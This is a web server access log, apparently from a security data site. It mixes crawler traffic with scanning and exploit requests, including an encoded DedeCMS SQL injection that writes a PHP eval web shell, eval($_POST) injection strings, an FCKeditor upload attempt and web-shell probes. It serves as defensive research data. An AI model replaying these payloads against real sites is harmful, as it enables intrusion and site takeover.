222.186.20.85 - - [24/Apr/2019:11:03:05 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 731 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
222.186.20.85 - - [24/Apr/2019:11:03:06 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 295 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
222.186.20.85 - - [24/Apr/2019:11:03:06 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 294 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
113.171.224.176 - - [24/Apr/2019:11:04:40 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [24/Apr/2019:11:12:07 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.213 - - [24/Apr/2019:11:18:14 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 11031586 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.142 - - [24/Apr/2019:11:27:24 -0700] "GET /self.logs/access.log.2017-12-11.gz HTTP/1.1" 200 29827 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.158 - - [24/Apr/2019:11:27:57 -0700] "GET /self.logs/access.log.2017-10-21.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.142 - - [24/Apr/2019:11:33:23 -0700] "GET /self.logs/access.log.2017-09-03.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
222.186.129.42 - - [24/Apr/2019:11:33:51 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:53 -0700] "POST //lequ.php HTTP/1.1" 404 294 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:53 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:53 -0700] "POST //coon.php HTTP/1.1" 404 294 "http://www.secrepo.com//coon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:53 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:54 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:54 -0700] "POST //12345.php HTTP/1.1" 404 294 "http://www.secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:54 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:54 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:55 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:55 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:55 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:55 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:56 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:56 -0700] "POST //Config_Shell.php HTTP/1.1" 404 294 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:56 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:56 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:57 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:57 -0700] "POST //indexa.php HTTP/1.1" 404 294 "http://www.secrepo.com//indexa.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:57 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:57 -0700] "POST //plus/mybak.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:58 -0700] "POST //plus/x.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:58 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.129.42 - - [24/Apr/2019:11:33:58 -0700] "POST //d.php HTTP/1.1" 404 294 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
123.125.71.74 - - [24/Apr/2019:11:40:02 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.112 - - [24/Apr/2019:11:40:04 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.219 - - [24/Apr/2019:11:40:06 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.158 - - [24/Apr/2019:11:41:54 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
157.55.39.213 - - [24/Apr/2019:11:43:16 -0700] "GET /self.logs/access.log.2018-06-18.gz HTTP/1.1" 200 26539 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
152.32.140.196 - - [24/Apr/2019:11:45:14 -0700] "POST //include/taglib/shell.lib.php?a=assert&b[0]=@eval($_POST[cmd]) HTTP/1.1" 404 284 "-" "Python-urllib/2.6" 
167.220.2.233 - - [24/Apr/2019:11:47:46 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
167.220.2.233 - - [24/Apr/2019:11:47:46 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
167.220.2.233 - - [24/Apr/2019:11:47:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
167.220.2.233 - - [24/Apr/2019:11:47:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
98.143.243.243 - - [24/Apr/2019:11:48:08 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
98.143.243.243 - - [24/Apr/2019:11:48:08 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
98.143.243.243 - - [24/Apr/2019:11:48:08 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
98.143.243.243 - - [24/Apr/2019:11:48:08 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
98.143.243.243 - - [24/Apr/2019:11:48:09 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
157.55.39.253 - - [24/Apr/2019:11:53:05 -0700] "GET /self.logs/error.log.2017-03-28.gz HTTP/1.1" 200 1012 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.253 - - [24/Apr/2019:11:53:30 -0700] "GET /self.logs/error.log.2017-02-02.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
90.143.87.248 - - [24/Apr/2019:12:01:11 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
113.171.224.176 - - [24/Apr/2019:12:07:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.213 - - [24/Apr/2019:12:17:14 -0700] "GET /self.logs/access.log.2017-03-30.gz HTTP/1.1" 200 15755 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.93.77 - - [24/Apr/2019:12:18:53 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.93.75 - - [24/Apr/2019:12:18:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
207.46.13.176 - - [24/Apr/2019:12:19:11 -0700] "GET /self.logs/error.log.2018-03-03.gz HTTP/1.1" 200 3259 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.253 - - [24/Apr/2019:12:28:13 -0700] "GET /self.logs/access.log.2017-01-03.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.14 - - [24/Apr/2019:12:30:30 -0700] "GET /self.logs/error.log.2018-11-25.gz HTTP/1.1" 200 3833 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
62.4.55.182 - - [24/Apr/2019:12:31:10 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
62.4.55.182 - - [24/Apr/2019:12:31:11 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
171.241.105.80 - - [24/Apr/2019:12:32:54 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
72.80.29.181 - - [24/Apr/2019:12:37:16 -0700] "GET / HTTP/1.1" 301 483 "http://SECREPO.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36,gzip(gfe)" 
72.80.29.181 - - [24/Apr/2019:12:37:16 -0700] "GET / HTTP/1.1" 200 12511 "http://SECREPO.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36,gzip(gfe)" 
157.55.39.253 - - [24/Apr/2019:12:38:05 -0700] "GET /self.logs/access.log.2018-03-23.gz HTTP/1.1" 200 16475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.75.46.114 - - [24/Apr/2019:12:40:31 -0700] "GET /Application/Admin/View/default/public/js/qscms.js HTTP/1.1" 404 340 "-" "okhttp/2.5.0" 
103.75.46.114 - - [24/Apr/2019:12:40:31 -0700] "GET /app/template/default/js/zph.js HTTP/1.1" 404 339 "-" "okhttp/2.5.0" 
157.55.39.213 - - [24/Apr/2019:12:42:08 -0700] "GET /self.logs/error.log.2017-10-05.gz HTTP/1.1" 200 2261 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.213 - - [24/Apr/2019:12:47:16 -0700] "GET /self.logs/access.log.2017-09-21.gz HTTP/1.1" 200 33322 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [24/Apr/2019:12:58:30 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
108.59.8.80 - - [24/Apr/2019:12:58:38 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.80 - - [24/Apr/2019:12:58:41 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
207.46.13.176 - - [24/Apr/2019:13:00:59 -0700] "GET /self.logs/error.log.2017-12-12.gz HTTP/1.1" 200 1803 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [24/Apr/2019:13:11:00 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.14 - - [24/Apr/2019:13:19:50 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [24/Apr/2019:13:25:22 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
184.160.17.245 - - [24/Apr/2019:13:25:36 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
184.160.17.245 - - [24/Apr/2019:13:25:36 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.102.9.139 - - [24/Apr/2019:13:26:15 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.141 - - [24/Apr/2019:13:26:15 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
186.115.16.240 - - [24/Apr/2019:13:28:54 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
186.115.16.240 - - [24/Apr/2019:13:28:54 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.102.6.157 - - [24/Apr/2019:13:36:23 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.6.156 - - [24/Apr/2019:13:36:23 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
41.170.9.236 - - [24/Apr/2019:13:37:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" 
207.46.13.14 - - [24/Apr/2019:13:38:43 -0700] "GET /self.logs/access.log.2017-09-24.gz HTTP/1.1" 200 25141 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
47.105.193.3 - - [24/Apr/2019:13:42:00 -0700] "GET /ueditor/index.html HTTP/1.1" 404 295 "http://www.secrepo.com/ueditor/index.html" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
195.201.106.71 - - [24/Apr/2019:13:47:02 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" 
54.36.150.141 - - [24/Apr/2019:13:57:02 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.176 - - [24/Apr/2019:13:57:51 -0700] "GET /self.logs/access.log.2017-07-16.gz HTTP/1.1" 200 16845 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.119.58.145 - - [24/Apr/2019:14:01:03 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.119.58.145 - - [24/Apr/2019:14:01:03 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
23.28.118.91 - - [24/Apr/2019:14:01:48 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
23.28.118.91 - - [24/Apr/2019:14:01:48 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.249.88.25 - - [24/Apr/2019:14:01:50 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.88.25 - - [24/Apr/2019:14:01:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
122.247.179.178 - - [24/Apr/2019:14:14:29 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:29 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:30 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:30 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:30 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:30 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:30 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:31 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:31 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:31 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
